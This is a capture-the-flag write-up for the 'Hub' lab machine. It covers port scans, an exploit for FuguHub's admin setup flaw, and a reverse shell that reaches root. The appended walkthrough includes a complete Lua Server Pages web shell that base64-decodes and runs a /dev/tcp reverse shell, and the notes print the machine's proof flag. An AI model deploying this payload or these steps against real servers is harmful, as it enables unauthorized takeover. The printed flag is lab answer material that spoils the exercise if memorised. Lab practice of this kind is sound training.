---
title: Hub
parent: Proving Grounds Play
grand_parent: Writeups
nav_order:
---
---
# Reconnaissance

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Hub]
└─$ sudo nmap -Pn -p- -sS -oN open-port_scan.txt --open 192.168.161.25 
[sudo] password for kali: 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-15 23:09 +0900
Nmap scan report for 192.168.161.25
Host is up (0.082s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8082/tcp open  blackice-alerts
9999/tcp open  abyss

Nmap done: 1 IP address (1 host up) scanned in 26.64 seconds

```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Hub]
└─$ sudo nmap -Pn -p22,80,8082,9999 -sSCV -A -oN full_tcp-scan.txt --open 192.168.161.25
Starting Nmap 7.99 ( https://nmap.org ) at 2026-06-15 23:22 +0900
Nmap scan report for 192.168.161.25
Host is up (0.080s latency).

PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 c9:c3:da:15:28:3b:f1:f8:9a:36:df:4d:36:6b:a7:44 (RSA)
|   256 26:03:2b:f6:da:90:1d:1b:ec:8d:8f:8d:1e:7e:3d:6b (ECDSA)
|_  256 fb:43:b2:b0:19:2f:d3:f6:bc:aa:60:67:ab:c1:af:37 (ED25519)
80/tcp   open  http       nginx 1.18.0
|_http-title: 403 Forbidden
|_http-server-header: nginx/1.18.0
8082/tcp open  http       Barracuda Embedded Web Server
|_http-server-header: BarracudaServer.com (Posix)
| http-webdav-scan: 
|   Server Date: Mon, 15 Jun 2026 14:23:27 GMT
|   Server Type: BarracudaServer.com (Posix)
|   WebDAV type: Unknown
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, PATCH, POST, PUT, COPY, DELETE, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK
|_http-title: Home
9999/tcp open  ssl/abyss?
| ssl-cert: Subject: commonName=FuguHub/stateOrProvinceName=California/countryName=US
| Subject Alternative Name: DNS:FuguHub, DNS:FuguHub.local, DNS:localhost
| Not valid before: 2019-07-16T19:15:09
|_Not valid after:  2074-04-18T19:15:09
|_ssl-date: 2026-06-15T14:23:33+00:00; 0s from scanner time.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|router
Running: Linux 4.X|5.X, MikroTik RouterOS 7.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3
OS details: Linux 4.15 - 5.19, Linux 5.0 - 5.14, MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3)
Network Distance: 4 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 22/tcp)
HOP RTT      ADDRESS
1   79.87 ms 192.168.45.1
2   79.84 ms 192.168.45.254
3   79.90 ms 192.168.251.1
4   79.93 ms 192.168.161.25

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.36 seconds

```

![](../../../assets/images/Pasted%20image%2020260615232617.png)
*すぐリダイレクトされて下記に遷移*

http://192.168.161.25:8082/Config-Wizard/wizard/SetAdmin.lsp

![](../../../assets/images/Pasted%20image%2020260615232648.png)

*Administratorを作成できる*

![](../../../assets/images/Pasted%20image%2020260615232756.png)

![](../../../assets/images/Pasted%20image%2020260615233324.png)

https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697

http://192.168.161.25:8082/rtl/protected/admin/customize.lsp

![](../../../assets/images/Pasted%20image%2020260615233654.png)

*MachineをリブートしてAdministratorを作成せずにPoCを実行したらうまくいった*

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Hub]
└─$ python3 exploit.py -r 192.168.225.25 -rp 8082 -l 192.168.45.196 -p 8082
[*] Checking for admin user...
[+] No admin user exists yet, creating account with admin:password
[+] User created!
[+] Logging in...
[+] Success! Injecting the reverse shell...
[+] Successfully injected the reverse shell into the About page.
[+] Triggering the reverse shell, check your listener...
```

```zsh
┌──(kali㉿kali)-[~/CTF/OffSec/Practice/Hub]
└─$ rlwrap -cAr nc -lvnp 8082
listening on [any] 8082 ...
connect to [192.168.45.196] from (UNKNOWN) [192.168.225.25] 35828
id
uid=0(root) gid=0(root) groups=0(root)
```

```zsh
cat /root/proof.txt
50a5bc33af6ba0290bbbd7904c026654
ip a
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
3: ens192: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:50:56:ab:1e:dd brd ff:ff:ff:ff:ff:ff
    altname enp11s0
    inet 192.168.225.25/24 brd 192.168.225.255 scope global ens192
       valid_lft forever preferred_lft forever
    inet6 fe80::250:56ff:feab:1edd/64 scope link 
       valid_lft forever preferred_lft forever
```


<details markdown="1">
<summary>Walkthrough</summary>

```zsh
Walkthrough
Close
Enumeration
Nmap
Initial step. Starting with an Nmap scan. We have 2 open ports "8082" and "9999".

nmap -Pn --open 172.17.7.2


Open the address. (Docker bind address to localhost)

http://127.0.0.1:8082


FuguHub
FuguHub

transforms your computer (or device) into a powerful and secure online storage system, letting you access and share files from any connected computer or device in the world.

Exploitation
Remote Code Execution
We find "CVE-2023-24078" recorded for **Real Time Logic FuguHub.



POC
The actual poc can be found here ->Fuguhub-8.1-RCE/Fuguhub-8-1-RCE-Report.pdf at main · ojan2021/Fuguhub-8.1-RCE · GitHub

Steps:

Go to the link: http://127.0.0.1:8082/Config-Wizard/wizard/SetAdmin.lsp

For the poc I am using "test@test.com" for all the fields.

Uncheck "Enable password recovery (by E-mail):"



Now go the link: http://127.0.0.1:8082/rtl/protected/wfslinks.lsp or click on "Web-File-Server" nav menu.



Once will fill the creds, we will get logged in.



Click on "fs" or go the link: http://127.0.0.1:8082/fs/

Create a file named as "rev.lsp" and put the below content into the file

<div style="margin-left:auto;margin-right: auto;width: 350px;">

<div id="info">
<h2>Lua Server Pages Reverse Shell</h2>
<p>Delightful, isn't it?</p>
</div>

<?lsp if request:method() == "GET" then ?>
   <?lsp os.execute("echo c2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4xLjc1LzEyMzQgMD4mMQo= | base64 -d | bash") ?>
<?lsp else ?>
   You sent a <?lsp=request:method()?> request
<?lsp end ?>

</div>
Listen netcat on your local machine



Now upload that rev.lsp file





Now go back, you will find the file listed there.

<img title="" src="images/listed.png" alt="" data-align="center">

Finally go the link: http://127.0.0.1:8082/rev.lsp

The payload will get executed.



Thank You :)
```

</details>